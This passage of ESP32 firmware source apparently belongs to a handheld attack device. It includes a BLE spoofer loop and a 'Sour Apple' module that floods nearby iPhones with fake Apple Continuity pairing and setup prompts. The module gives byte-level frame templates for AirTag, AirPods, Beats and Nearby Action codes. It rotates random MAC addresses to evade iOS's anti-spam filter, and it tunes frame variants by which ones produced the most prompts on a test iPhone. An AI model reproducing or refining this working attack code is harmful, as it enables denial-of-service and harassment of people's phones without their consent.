  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: changeDeviceTypePrev(); break;
        case 1: changeDeviceTypeNext(); break;
        case 2: changeAdvTypeNext(); break;
        case 3: toggleAdvertising(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
  int x, y;
  if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 4) {
                feature_exit_requested = true;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void spooferSetup() {
  if (!bleRequireStackOrExit()) return;
  setTouchButtonInputEnabled(true);
  bleSetSpooferNavLabels();
  spooferResetPanelCache();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  tft.drawFastHLine(0, 19, 240, UI_LINE);

  randomSeed(analogRead(0));
  setupTouchscreen();

  tft.setTextFont(1);
  tft.setTextSize(1);

  tft.fillRect(0, 20, 240, 16, DARK_GRAY);
  tft.setTextFont(1);
  tft.setTextColor(TFT_WHITE);
  tft.setTextSize(1);
  tft.setCursor(5, 24);

  updateSpoofer();
  runUI();

  Printspoofer("[!!] System Diagnostics", TFT_RED, true);
  redrawTouchButtonBar();

  for (int i = 0; i <= 4; i++) {
    sppferLoadingBar(i);
    delay(random(500));
    redrawTouchButtonBar();
  }

  Printspoofer("[+] System Ready!", TFT_GREEN, true);

  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

#if HAS_PCF8574_BUTTONS
  pcf.pinMode(BTN_UP, INPUT_PULLUP);
  pcf.pinMode(BTN_DOWN, INPUT_PULLUP);
  pcf.pinMode(BTN_LEFT, INPUT_PULLUP);
  pcf.pinMode(BTN_RIGHT, INPUT_PULLUP);
  pcf.pinMode(BTN_SELECT, INPUT_PULLUP);
#endif

  uiDrawn = false;
  tft.drawFastHLine(0, 19, 240, UI_LINE);
  redrawTouchButtonBar();
}

void spooferLoop() {
  static unsigned long lastUpdate = 0;
  const unsigned long updateInterval = 50;

  unsigned long now = millis();
  if (now - lastUpdate >= updateInterval) {
    lastUpdate = now;

    // Remapped layout: LEFT=Exit (was device type -), SELECT=toggle
    // advertising (the most important action, was UP). UP=device type -
    // /Prev (was LEFT), DOWN=device type +/Next (was RIGHT; Prev/Next
    // always sit on UP/DOWN), RIGHT=adv type (was DOWN).
    if (feature_active && isButtonPressed(BTN_LEFT)) {
      feature_exit_requested = true;
      return;
    }

    runUI();
    tft.drawFastHLine(0, 19, 240, UI_LINE);

    // Edge-detected through the centrally debounced isButtonPressedEdge()
    // (~25ms lockout) instead of the old hand-rolled 500ms-locked
    // handleButtonPress() -- that extra lockout was long enough to drop a
    // legitimate quick second press (e.g. mashing Next/Prev), not just
    // contact bounce.
    if (isButtonPressedEdge(BTN_DOWN))   changeDeviceTypeNext();
    if (isButtonPressedEdge(BTN_UP))     changeDeviceTypePrev();

    if (isButtonPressedEdge(BTN_RIGHT))  changeAdvTypeNext();
    if (isButtonPressedEdge(BTN_SELECT)) toggleAdvertising();

    // Periodic safe MAC rotation for Apple Continuity. iOS drops repeated
    // advertisements from a static MAC (anti-spam filter), so the address
    // must keep changing. spooferBurstOnce() rotates safely (stop -> new
    // random-static MAC -> start), never while the radio is transmitting.
    if (isAdvertising && device_choice == 0 && attack_state == 1 && pAdvertising) {
      const uint32_t intervalMs =
          (uint32_t)(delaySeconds > 0 ? delaySeconds : 1) * 1000UL;
      if ((uint32_t)(now - s_spooferLastBurstMs) >= intervalMs) {
        spooferBurstOnce();
      }
    }
  }
}

void exit() {
  spooferResetPanelCache();

  if (isAdvertising && pAdvertising) {
    pAdvertising->stop();
    isAdvertising = false;
  }
  s_spooferAdvConfigured = false;
}
}

namespace SourApple {

// ---------------------------------------------------------------------------
// Sour Apple - Apple Continuity prompt flooding.
//
// The feature floods Apple Continuity frames, each from a fresh random-static
// address, so the phone keeps offering pairing/setup prompts instead of
// filtering the repeats. What made it dead on the air (and its Exit button
// unresponsive) was everything around the frame:
//
//   * the radio was started as soon as the screen opened, with no way to
//     stop it and no Start/Stop control;
//   * updatedisplay() called Advertising->stop() on every repaint, so the
//     radio was live only for the ~40ms before each blocking full-screen
//     redraw -- and LEFT was sampled only between two of those redraws;
//   * the random address generated on every pass was discarded, so every
//     advertisement came from the same address: exactly the repetition that
//     iOS' anti-spam filter drops;
//   * addServiceUUID() was queued again on every pass. NimBLE ignores that
//     list once custom advertising data is set, so it only grew forever.
//
// This now follows the Apple path proven in BleSpoofer: stop -> new
// random-static address -> set the exact frame -> start, with no radio work
// anywhere in the draw path and a loop that never blocks.
//
// Measured on one iPhone (iOS 26.6.2), radio side confirmed over serial.
// Prompts only flow while the pending one is dismissed: an open prompt blocks
// the next, and dismissing it released the following one 2-6s later. Counting
// that way, in one session: AirTag frame 7 prompts, AirPods frame 4 (all
// different accessories), the original 17-byte 0x0F frame 1, the
// EvilAppleJuice audio frame 0. The default variant therefore sweeps every
// model of every family in turn, AirTag first, and holds each frame for 2s.
// ---------------------------------------------------------------------------

static constexpr int kStatusBarY = 20;
static constexpr int kStatusBarH = 16;
static constexpr int kIconSize = 16;
static constexpr int kIconCount = 1;

static constexpr int kInfoY = 42;
static constexpr int kRowH = 16;
static constexpr int kLabelX = 10;
static constexpr int kValueX = 70;
static constexpr int kValueW = 100;
static constexpr int kRightMargin = 10;
static constexpr int kFieldH = 10;
static constexpr int kLogHdrY = 130;
static constexpr int kLogY = 146;
static constexpr int kLogLineH = 12;
static constexpr int kMaxLog = 16;
static constexpr int kLogLineLen = 40;

static constexpr unsigned long kBtnDebounceMs = 220;
// How long each frame (and its address) is held before the next rotation. This
// is also the only moment the radio is off: the controller rejects an address
// change while advertising. RIGHT cycles these; see kDefaultRateIndex.
static const uint16_t kRatesMs[] = {1000, 2000, 5000, 10000, 20000};
static constexpr uint8_t kRateCount = sizeof(kRatesMs) / sizeof(kRatesMs[0]);
static constexpr uint8_t kDefaultRateIndex = 1;  // 2s
static constexpr unsigned long kFieldMs = 250;
static constexpr unsigned long kTouchPollMs = 50;
static constexpr unsigned long kLogMs = 2000;
static constexpr unsigned long kSerialMs = 3000;

// The Apple Continuity frames this feature can impersonate. The two "Nearby
// Action" (0x0F) layouts differ in whether the AppleJuice preamble TLV is
// present and in whether the 3 bytes after the action are the fixed
// 60 4C 95 tag or fresh random ones. Measured on an iPhone those choices
// decide whether any prompt shows up at all, so they are selectable from the
// screen with UP/DOWN instead of being guessed.
enum SourBuilder : uint8_t {
  // Automatic: walks every model of every family below, in turn, so nothing has
  // to be selected by hand and no frame is starved.
  bAuto = 0,
  // 0x07 "Proximity Pairing" family: the accessory prompts.
  bAudioTag,     // 31-byte frame exactly as AirTag Spoofer sends
  bAudioBle,     // 31-byte frame exactly as this firmware's BLE Spoofer sends
  bAudioRef,     // 31-byte frame from EvilAppleJuice-ESP32
  // 0x0F "Nearby Action" family: the setup / pairing prompts.
  bShort17Orig,  // the original Sour Apple frame (random tag, overrun tail)
  bSetup23,      // 23-byte frame, AppleJuice / EvilAppleJuice layout
  bSetup23Rnd,   //   same, but the 3 tag bytes are randomised per frame
  bShort17Rnd,   // 17-byte frame, action TLV first, random tag, clean tail
  bShort17Fix,   //   same, fixed 60 4C 95 tag
};

struct SourVariant {
  const char* name;
  uint8_t builder;
};

struct SourAction {
  uint16_t code;  // 0x0F actions are one byte, 0x07 audio model IDs are two
  const char* name;
};

// "Nearby Action" (0x0F) action codes: each one makes the iPhone offer a
// different setup/pairing prompt.
static const SourAction kSetupActions[] = {
  {0x01, "AppleTV Setup"},
  {0x06, "AppleTV Pair"},
  {0x20, "AppleTV New User"},
  {0x0B, "HomePod Setup"},
  {0x0D, "HomeKit Setup"},
  {0x13, "Keyboard"},
  {0x27, "Connect to Network"},
  {0x2B, "AppleID Setup"},
  {0xC0, "Audio Sync"},
  {0x02, "Transfer Number"},
  {0x09, "Setup New Phone"},
  {0x1E, "TV Color Balance"},
  {0x2D, "Code 0x2D"},
  {0x2F, "Code 0x2F"},
};
static constexpr uint8_t kSetupActionCount =
  sizeof(kSetupActions) / sizeof(kSetupActions[0]);

// "Proximity Pairing" (0x07) audio model IDs, one prompt per accessory.
static const SourAction kAudioModels[] = {
  {0x02, "AirPods"},
  {0x03, "PowerBeats"},
  {0x05, "Beats X"},
  {0x06, "Beats Solo 3"},
  {0x09, "Beats Studio 3"},
  {0x0A, "AirPods Max"},
  {0x0B, "PowerBeats Pro"},
  {0x0C, "Beats Solo Pro"},
  {0x0E, "AirPods Pro"},
  {0x0F, "AirPods Gen 2"},
  {0x10, "Beats Flex"},
  {0x11, "Beats Studio Buds"},
  {0x12, "Beats Fit Pro"},
  {0x13, "AirPods Gen 3"},
  {0x14, "AirPods Pro G2"},
  {0x16, "Beats Studio Buds+"},
  {0x17, "Beats Studio Pro"},
  {0x24, "AirPods Pro USBC"},
  {0x25, "Beats Solo 4"},
  {0x26, "Beats Solo Buds"},
  {0x2E, "Software Update"},
  {0x2F, "Powerbeats Fit"},
};
static constexpr uint8_t kAudioModelCount =
  sizeof(kAudioModels) / sizeof(kAudioModels[0]);

// 0x07 model IDs exactly as this firmware's BLE Spoofer sends them: 16-bit
// model at index 10 of the frame, one prompt per AirPods/Beats accessory.
static const SourAction kAppleBleModels[] = {
  {0x0220, "AirPods"},
  {0x0E20, "AirPods Pro"},
  {0x0A20, "AirPods Max"},
  {0x0F20, "AirPods Gen 2"},
  {0x1320, "AirPods Gen 3"},
  {0x1420, "AirPods Pro G2"},
  {0x0320, "PowerBeats"},
  {0x0B20, "PowerBeats Pro"},
  {0x0C20, "Beats Solo Pro"},
  {0x1120, "Beats Studio Buds"},
  {0x1020, "Beats Flex"},
  {0x0520, "Beats X"},
  {0x0620, "Beats Solo 3"},
  {0x0920, "Beats Studio 3"},
  {0x1720, "Beats Studio Pro"},
  {0x1220, "Beats Fit Pro"},
  {0x1620, "Beats Studio Buds+"},
};
static constexpr uint8_t kAppleBleModelCount =
  sizeof(kAppleBleModels) / sizeof(kAppleBleModels[0]);

// AirTag Spoofer uses the same 0x07 layout with AirTag model IDs.
static const SourAction kAirTagModels[] = {
  {0x0055, "AirTag"},
  {0x0030, "AirTag Alt"},
};
static constexpr uint8_t kAirTagModelCount =
  sizeof(kAirTagModels) / sizeof(kAirTagModels[0]);

// The automatic rotation is a short, deliberately interleaved pool: only the
// frames that produced prompts on the test iPhone (AirTag 7, AirPods/Beats 4,
// the original 0x0F frame 1), with consecutive entries from different families
// so the phone is never hit with a long run of the same type. Twelve frames
// means, at the default 2s rate, the same identity comes back every ~24s.
struct SourAutoEntry {
  uint8_t builder;
  uint16_t code;
  const char* familyName;  // FRAME row + serial
  const char* name;        // ACTION row
};

static const SourAutoEntry kAutoPool[] = {
  {bAudioTag,    0x0055, "aud tag",  "AirTag"},
  {bAudioBle,    0x0220, "aud ble",  "AirPods"},
  {bShort17Orig, 0x27,   "orig 17B", "Connect to Network"},
  {bAudioTag,    0x0030, "aud tag",  "AirTag Alt"},
  {bAudioBle,    0x0E20, "aud ble",  "AirPods Pro"},
  {bShort17Orig, 0x01,   "orig 17B", "AppleTV Setup"},
  {bAudioBle,    0x0F20, "aud ble",  "AirPods Gen 2"},
  {bShort17Orig, 0x09,   "orig 17B", "Setup New Phone"},
  {bAudioBle,    0x0320, "aud ble",  "PowerBeats"},
  {bShort17Orig, 0x2B,   "orig 17B", "AppleID Setup"},
  {bAudioBle,    0x0520, "aud ble",  "Beats X"},
  {bShort17Orig, 0x02,   "orig 17B", "Transfer Number"},
};
static constexpr uint8_t kAutoPoolCount =
  sizeof(kAutoPool) / sizeof(kAutoPool[0]);

static const SourVariant kVariants[] = {
  // Automatic first: the whole point is the largest possible number of prompts
  // without having to pick a device type by hand.
  {"auto",     bAuto},
  {"aud tag",  bAudioTag},
  {"aud ble",  bAudioBle},
  {"aud ref",  bAudioRef},
  {"orig 17B", bShort17Orig},
  {"ref fix",  bSetup23},
  {"ref rnd",  bSetup23Rnd},
  {"sht rnd",  bShort17Rnd},
  {"sht fix",  bShort17Fix},
};
static constexpr uint8_t kVariantCount =
  sizeof(kVariants) / sizeof(kVariants[0]);

static int iconX[kIconCount] = {10};
static int iconY = kStatusBarY;

static bool s_uiDrawn = false;
static bool s_staticDrawn = false;
static bool s_running = false;
static bool s_advConfigured = false;
static bool s_addrIsRandom = false;
static unsigned long s_lastBtnMs = 0;
static unsigned long s_lastRotateMs = 0;
static unsigned long s_lastFieldMs = 0;
static unsigned long s_lastLogMs = 0;
static unsigned long s_lastSerialMs = 0;
static uint32_t s_txCount = 0;
static uint8_t s_variantIndex = 0;
static uint8_t s_activeBuilder = bAudioTag;  // builder used for the last packet
static uint16_t s_activeCode = 0;            // code of the last packet
static const char* s_activeName = "AirTag";  // display name of the last packet
static const char* s_activeFamilyName = "aud tag";
static uint8_t s_autoItem = 0;               // auto rotation: cursor into kAutoPool
static uint8_t s_rateIndex = kDefaultRateIndex;

static uint8_t s_mac[6] = {0};      // NimBLE native order: [5] is the MSB
static uint8_t s_packet[31] = {0};  // exact frame handed to the controller
static size_t s_packetLen = 0;

static BLEServer* s_server = nullptr;
static BLEAdvertising* s_advertising = nullptr;

static char s_log[kMaxLog][kLogLineLen];
static uint16_t s_logColor[kMaxLog];
static int s_logCount = 0;
static char s_dispLog[kMaxLog][kLogLineLen];
static uint16_t s_dispColor[kMaxLog];

static char s_cacheState[20] = {0};
static char s_cacheMac[24] = {0};
static char s_cacheFrame[20] = {0};
static char s_cacheAction[28] = {0};
static char s_cacheRate[24] = {0};
static char s_cacheTx[16] = {0};

static int rowY(int row) {
  return kInfoY + 4 + row * kRowH;
}

static int logBottomY() {
  // Leave a 2px gap above the touch nav bar.
  return bleContentBottom() - 2;
}

static int logVisibleLines() {
  const int h = logBottomY() - kLogY;
  if (h < kLogLineH) {
    return 1;
  }
  int n = h / kLogLineH;
  if (n > kMaxLog) {
    n = kMaxLog;
  }
  return n;
}

// Repaint only when the text actually changed: the loop runs every few
// milliseconds and must never spend that time on avoidable SPI traffic.
static void paintField(int x, int y, int w, char* cache, size_t cacheSz,
                       const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  tft.setTextSize(1);
  int clearW = w;
  if (cache && cache[0]) {
    const int oldW = tft.textWidth(cache) + 2;
    const int newW = text[0] ? (tft.textWidth(text) + 2) : 0;
    clearW = oldW > newW ? oldW : newW;
    if (clearW > w) {
      clearW = w;
    }
  }
  tft.fillRect(x, y, clearW, kFieldH, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(x, y);
  tft.print(text);

  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void paintFieldRight(int y, int rightMargin, char* cache, size_t cacheSz,
                            const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  if (cache && strcmp(cache, text) == 0) {
    return;
  }

  tft.setTextSize(1);
  const int newW = text[0] ? tft.textWidth(text) : 0;
  const int oldW = (cache && cache[0]) ? tft.textWidth(cache) : 0;
  const int useW = oldW > newW ? oldW : newW;
  const int clearW = useW + 2;
  tft.fillRect(SCREEN_WIDTH - rightMargin - clearW, y, clearW, kFieldH, TFT_BLACK);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(SCREEN_WIDTH - rightMargin - newW, y);
  tft.print(text);
  if (cache && cacheSz > 0) {
    strncpy(cache, text, cacheSz - 1);
    cache[cacheSz - 1] = '\0';
  }
}

static void drawStaticChrome() {
  if (s_staticDrawn) {
    return;
  }
  s_staticDrawn = true;

  tft.setTextSize(1);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(kLabelX, rowY(0));
  tft.print("STATE");
  tft.setCursor(kLabelX, rowY(1));
  tft.print("MAC");
  tft.setCursor(kLabelX, rowY(2));
  tft.print("FRAME");
  tft.setCursor(kLabelX, rowY(3));
  tft.print("ACTION");
  tft.setCursor(kLabelX, rowY(4));
  tft.print("RATE");

  tft.fillRect(0, kLogHdrY, SCREEN_WIDTH, kLogY - kLogHdrY, TFT_BLACK);
  tft.setTextColor(ORANGE, TFT_BLACK);
  tft.setCursor(kLabelX, kLogHdrY + 2);
  tft.print("ACTIVITY");
  const int ruleX = kLabelX + tft.textWidth("ACTIVITY") + 8;
  tft.drawFastHLine(ruleX, kLogHdrY + 6, SCREEN_WIDTH - kRightMargin - ruleX, UI_LINE);
}

static const SourAction* activeTable(uint8_t builder, uint8_t* count) {
  switch (builder) {
    case bAudioBle:
      *count = kAppleBleModelCount;
      return kAppleBleModels;
    case bAudioTag:
      *count = kAirTagModelCount;
      return kAirTagModels;
    case bAudioRef:
      *count = kAudioModelCount;
      return kAudioModels;
    default:
      *count = kSetupActionCount;
      return kSetupActions;
  }
}

// Total frames the current selection walks. Shown on screen because the repeat
// interval that matters to the phone is rate x pool size.
static uint16_t currentPoolSize() {
  if (kVariants[s_variantIndex].builder == bAuto) {
    return kAutoPoolCount;
  }
  uint8_t c = 0;
  activeTable(s_activeBuilder, &c);
  return c;
}

static void updateInfoFields(bool force) {
  drawStaticChrome();

  if (force) {
    s_cacheState[0] = '\0';
    s_cacheMac[0] = '\0';
    s_cacheFrame[0] = '\0';
    s_cacheAction[0] = '\0';
    s_cacheTx[0] = '\0';
    s_cacheRate[0] = '\0';
  }

  char mac[24];
  if (s_running) {
    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
             s_mac[5], s_mac[4], s_mac[3], s_mac[2], s_mac[1], s_mac[0]);
  } else {
    snprintf(mac, sizeof(mac), "--:--:--:--:--:--");
  }

  char frame[20];
  if (kVariants[s_variantIndex].builder == bAuto) {
    // Stopped: just "auto". Running: "auto: <current group>", which changes
    // every rotation as the interleaved pool advances.
    snprintf(frame, sizeof(frame), s_running ? "auto: %s" : "auto",
             s_activeFamilyName);
  } else {
    snprintf(frame, sizeof(frame), "%s %u/%u", kVariants[s_variantIndex].name,
             (unsigned)(s_variantIndex + 1), (unsigned)kVariantCount);
  }

  char action[28];
  if (s_activeCode > 0xFF) {
    snprintf(action, sizeof(action), "0x%04X %s", (unsigned)s_activeCode, s_activeName);
  } else {
    snprintf(action, sizeof(action), "0x%02X %s", (unsigned)s_activeCode, s_activeName);
  }

  char tx[16];
  snprintf(tx, sizeof(tx), "TX %lu", (unsigned long)s_txCount);

  // The repeat interval that matters to the phone is how long until the same
  // frame comes round again, so show the whole cycle too.
  const uint16_t pool = currentPoolSize();
  const unsigned long rateS = (unsigned long)kRatesMs[s_rateIndex] / 1000UL;
  char rate[24];
  snprintf(rate, sizeof(rate), "%lus cycle %lus", rateS,
           rateS * (unsigned long)(pool ? pool : 1));

  paintField(kValueX, rowY(0), kValueW, s_cacheState, sizeof(s_cacheState),
             s_running ? "Advertising" : "Idle", s_running ? UI_OK : UI_DIM_TEXT);
  paintFieldRight(rowY(0), kRightMargin, s_cacheTx, sizeof(s_cacheTx), tx, UI_DIM_TEXT);
  paintField(kValueX, rowY(1), kValueW + 40, s_cacheMac, sizeof(s_cacheMac), mac, WHITE);
  paintField(kValueX, rowY(2), kValueW + 40, s_cacheFrame, sizeof(s_cacheFrame),
             frame, ORANGE);
  paintField(kValueX, rowY(3), SCREEN_WIDTH - kValueX - kRightMargin, s_cacheAction,
             sizeof(s_cacheAction), action, WHITE);
  paintField(kValueX, rowY(4), kValueW + 40, s_cacheRate, sizeof(s_cacheRate),
             rate, UI_DIM_TEXT);
}

static void paintLogSlot(int index, const char* text, uint16_t color) {
  const int cap = logVisibleLines();
  const int bottom = logBottomY();
  if (index < 0 || index >= cap) {
    return;
  }
  if (!text) {
    text = "";
  }

  const int y = kLogY + index * kLogLineH;
  if (y + kLogLineH > bottom) {
    return;
  }
  if (strcmp(s_dispLog[index], text) == 0 && s_dispColor[index] == color) {
    return;
  }

  tft.setTextSize(1);
  tft.fillRect(0, y, SCREEN_WIDTH, kLogLineH, TFT_BLACK);
  if (text[0]) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(kLabelX, y);
    tft.print(text);
  }

  strncpy(s_dispLog[index], text, kLogLineLen - 1);
  s_dispLog[index][kLogLineLen - 1] = '\0';
  s_dispColor[index] = color;
}

static void syncLogDisplay() {
  const int cap = logVisibleLines();
  for (int i = 0; i < cap; i++) {
    if (i < s_logCount) {
      paintLogSlot(i, s_log[i], s_logColor[i]);
    } else if (s_dispLog[i][0]) {
      paintLogSlot(i, "", TFT_BLACK);
    }
  }
}

static void logLine(const char* text, uint16_t color) {
  if (!text) {
    text = "";
  }
  const int cap = logVisibleLines();
  const bool scrolled = (s_logCount >= cap);

  if (scrolled) {
    for (int i = 0; i < cap - 1; i++) {
      memcpy(s_log[i], s_log[i + 1], kLogLineLen);
      s_logColor[i] = s_logColor[i + 1];
    }
    s_logCount = cap - 1;
  }

  strncpy(s_log[s_logCount], text, kLogLineLen - 1);
  s_log[s_logCount][kLogLineLen - 1] = '\0';
  s_logColor[s_logCount] = color;
  const int lineIdx = s_logCount;
  s_logCount++;

  if (scrolled) {
    // Shifted lines: repaint each dirty slot only (no full-zone wipe).
    syncLogDisplay();
    return;
  }
  paintLogSlot(lineIdx, s_log[lineIdx], color);
}

static void updateNavLabels() {
  if (!featureHasTouchNavBar()) {
    return;
  }
  // Remapped layout: LEFT=Exit, SELECT=Start/Stop (the screen's main action),
  // UP/DOWN walk the frame variants, RIGHT cycles the hold time.
  setTouchNavLabels("Exit", "Next", s_running ? "Stop" : "Start", "Prev", "Rate");
  redrawTouchButtonBar();
}

static void runUI() {
  static const unsigned char* icons[kIconCount] = {bitmap_icon_go_back};

  if (!s_uiDrawn) {
    tft.fillRect(0, kStatusBarY, SCREEN_WIDTH, kStatusBarH, DARK_GRAY);
    for (int i = 0; i < kIconCount; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], kIconSize, kIconSize, ORANGE);
      }
    }
    tft.drawFastHLine(0, kStatusBarY + kStatusBarH, SCREEN_WIDTH, UI_LINE);
    s_uiDrawn = true;
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck < kTouchPollMs) {
    return;
  }
  lastTouchCheck = millis();

  int x = 0;
  int y = 0;
  if (!feature_active || !readTouchXY(x, y)) {
    return;
  }
  if (y <= kStatusBarY || y >= kStatusBarY + kStatusBarH) {
    return;
  }
  for (int i = 0; i < kIconCount; i++) {
    if (x > iconX[i] && x < iconX[i] + kIconSize) {
      feature_exit_requested = true;
      break;
    }
  }
}

// Frame templates. Only the action/model byte differs between frames; the
// optional random tail keeps otherwise identical frames from looking like a
// replay of the same advertisement.
static const uint8_t kFrameSetup[23] = {
  0x16, 0xFF, 0x4C, 0x00,                    // AD: len 22, manufacturer, Apple
  0x04, 0x04, 0x2A, 0x00, 0x00, 0x00,        // continuity TLV 0x04
  0x0F, 0x05, 0xC1, 0x00,                    // continuity TLV 0x0F, action patched below
  0x60, 0x4C, 0x95,                          // 60 4C 95 action tag
  0x00, 0x00, 0x10, 0x00, 0x00, 0x00,        // padding TLVs, parse cleanly to the end
};

static const uint8_t kFrameShort[17] = {
  0x10, 0xFF, 0x4C, 0x00,                    // AD: len 16, manufacturer, Apple
  0x0F, 0x05, 0xC1, 0x00,                    // continuity TLV 0x0F, first in the frame
  0x60, 0x4C, 0x95,                          // action tag
  0x00, 0x00, 0x10, 0x00, 0x00, 0x00,        // padding TLVs
};

static void buildSourPacket() {
  uint8_t builder = kVariants[s_variantIndex].builder;
  uint16_t code = 0;
  const char* name = "";
  const char* familyName = kVariants[s_variantIndex].name;

  if (builder == bAuto) {
    // Walk the short interleaved pool: consecutive frames come from different
    // families, and the same identity returns after kAutoPoolCount rotations.
    const SourAutoEntry& e = kAutoPool[s_autoItem];
    s_autoItem = (uint8_t)((s_autoItem + 1) % kAutoPoolCount);
    builder = e.builder;
    code = e.code;
    name = e.name;
    familyName = e.familyName;
  } else {
    uint8_t count = 0;
    const SourAction* table = activeTable(builder, &count);
    const SourAction& item = table[random((long)count)];
    code = item.code;
    name = item.name;
  }

  s_activeBuilder = builder;
  s_activeCode = code;
  s_activeName = name;
  s_activeFamilyName = familyName;

  switch (builder) {
    case bAudioBle: {
      // Byte for byte the frame this firmware's BLE Spoofer already sends for
      // Apple Continuity: Flags AD, manufacturer AD, 16-bit model at 10..11.
      static const uint8_t kTemplate[31] = {
        0x02, 0x01, 0x1A,                                 // Flags AD
        0x1B, 0xFF, 0x4C, 0x00,                           // manufacturer AD
        0x07, 0x16,                                       // 0x07 + payload len
        0x07,                                             // status
        0x00, 0x00,                                       // model, patched below
        0x75, 0xAA, 0x30, 0x01, 0x00, 0x00,               // continuity signature
        0x45, 0x12, 0x12, 0x12,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      };
      memcpy(s_packet, kTemplate, sizeof(kTemplate));
      s_packet[10] = (uint8_t)(code >> 8);
      s_packet[11] = (uint8_t)(code & 0xFF);
      s_packetLen = sizeof(kTemplate);
      return;
    }

    case bAudioTag: {
      // Byte for byte the frame AirTag Spoofer already sends: 0x05 prefix
      // ("new AirTag"), 16-bit model at 7..8, 16 random bytes at the end.
      s_packet[0] = 0x1E;
      s_packet[1] = 0xFF;
      s_packet[2] = 0x4C;
      s_packet[3] = 0x00;
      s_packet[4] = 0x07;
      s_packet[5] = 0x19;
      s_packet[6] = 0x05;
      s_packet[7] = (uint8_t)(code >> 8);
      s_packet[8] = (uint8_t)(code & 0xFF);
      s_packet[9] = 0x55;
      s_packet[10] = (uint8_t)((random(10) << 4) | random(10));
      s_packet[11] = (uint8_t)((random(8) << 4) | random(10));
      s_packet[12] = (uint8_t)random(256);
      s_packet[13] = 0x00;
      s_packet[14] = 0x00;
      esp_fill_random(&s_packet[15], 16);
      s_packetLen = 31;
      return;
    }

    case bAudioRef: {
      // EvilAppleJuice-ESP32's audio frame: one-byte model at index 7, then the
      // fixed body, then fresh random bytes so no two frames are identical.
      static const uint8_t kAudioHead[7] = {0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x07};
      static const uint8_t kAudioBody[11] =
        {0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12};
      memset(s_packet, 0, sizeof(s_packet));
      memcpy(s_packet, kAudioHead, sizeof(kAudioHead));
      s_packet[7] = (uint8_t)code;
      memcpy(s_packet + 8, kAudioBody, sizeof(kAudioBody));
      esp_fill_random(s_packet + 19, sizeof(s_packet) - 19);
      s_packetLen = sizeof(s_packet);
      return;
    }

    default:
      break;
  }

  // 0x0F "Nearby Action" family.
  const bool setup = (builder == bSetup23 || builder == bSetup23Rnd);
  const size_t len = setup ? sizeof(kFrameSetup) : sizeof(kFrameShort);
  memcpy(s_packet, setup ? kFrameSetup : kFrameShort, len);

  const int actionOffset = setup ? 13 : 7;
  s_packet[actionOffset] = (uint8_t)code;

  if (builder == bSetup23Rnd || builder == bShort17Rnd ||
      builder == bShort17Orig) {
    // Fresh tag per frame: an identical frame from a new address still looks
    // like a replay to the phone.
    esp_fill_random(&s_packet[actionOffset + 1], 3);
  }
  if (builder == bShort17Orig) {
    // The original Sour Apple tail: "10 <random x3>" declares a random TLV
    // length that overruns the frame, and that is where iOS' parser stops.
    s_packet[13] = 0x10;
    esp_fill_random(&s_packet[14], 3);
  }
  s_packetLen = len;
}

// Fresh random-static address. ble_hs_id_set_rnd() takes the address in
// NimBLE native order (index 5 is the most-significant byte), and a
// random-static address has its two most-significant bits set.
static void newRandomStaticAddress() {
  uint8_t mac[6];
  for (int attempt = 0; attempt < 8; attempt++) {
    esp_fill_random(mac, sizeof(mac));
    mac[5] |= 0xC0;
    mac[0] &= 0xFE;   // unicast
    if (ble_hs_id_set_rnd(mac) == 0) {
      memcpy(s_mac, mac, sizeof(s_mac));
      return;
    }
  }
}

static bool ensureAdvertising() {
  if (!s_advertising) {
    ensureBleStackReady();
    if (!s_server) {
      s_server = BLEDevice::createServer();
    }
    if (s_server) {
      s_advertising = s_server->getAdvertising();
    }
  }
  return s_advertising != nullptr;
}

static void stopRadio() {
  // Guarded: stopping an inactive advertiser only logs an HCI error.
  if (s_advertising && s_advertising->isAdvertising()) {
    s_advertising->stop();
  }
}

// stop -> new address -> exact frame -> start, the rotation order documented
// for the Apple path in BleSpoofer: the controller rejects an address change
// while advertising, and changing it mid-transmission is what locked up the
// S3 in the older attempt.
static void rotateAdvertising() {
  s_lastRotateMs = millis();

  if (!ensureAdvertising()) {
    return;
  }

  stopRadio();

  if (!s_addrIsRandom) {
    NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
